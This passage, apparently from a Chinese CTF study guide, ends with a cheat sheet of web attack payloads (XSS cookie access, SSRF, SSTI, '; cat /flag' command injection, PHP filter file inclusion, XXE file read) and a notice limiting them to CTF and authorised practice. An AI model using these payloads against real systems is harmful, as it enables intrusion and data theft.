XSS:     <script>alert(document.cookie)</script>
SSRF:    url=http://127.0.0.1/flag
SSTI:    {{7*7}} / ${7*7}
命令注入: ; cat /flag
文件包含: ?file=php://filter/read=convert.base64-encode/resource=flag.php
XXE:     <!ENTITY xxe SYSTEM "file:///flag">
```

---

> **安全提示**：本文档中的所有技术仅用于CTF竞赛和安全学习。未经授权对真实系统进行测试属于违法行为。请始终在授权环境中练习。
